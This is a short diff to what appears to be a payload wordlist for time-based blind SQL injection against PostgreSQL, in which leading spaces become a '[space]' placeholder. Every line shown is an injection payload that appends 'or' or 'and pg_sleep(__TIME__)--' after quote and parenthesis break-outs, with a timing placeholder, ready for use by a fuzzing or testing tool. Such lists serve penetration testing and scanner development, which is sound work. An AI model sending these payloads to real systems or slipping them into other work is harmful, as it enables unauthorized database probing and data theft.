@@ -1,5 +1,5 @@
-pg_sleep(__TIME__)--
- or pg_sleep(__TIME__)--
+[space]pg_sleep(__TIME__)--
+[space]or pg_sleep(__TIME__)--
 " or pg_sleep(__TIME__)--
 ' or pg_sleep(__TIME__)--
 ) or pg_sleep(__TIME__)--
@@ -8,7 +8,7 @@ pg_sleep(__TIME__)--
 )) or pg_sleep(__TIME__)--
 ")) or pg_sleep(__TIME__)--
 ')) or pg_sleep(__TIME__)--
- and pg_sleep(__TIME__)--
+[space]and pg_sleep(__TIME__)--
 " and pg_sleep(__TIME__)--
 ' and pg_sleep(__TIME__)--
 ) and pg_sleep(__TIME__)--
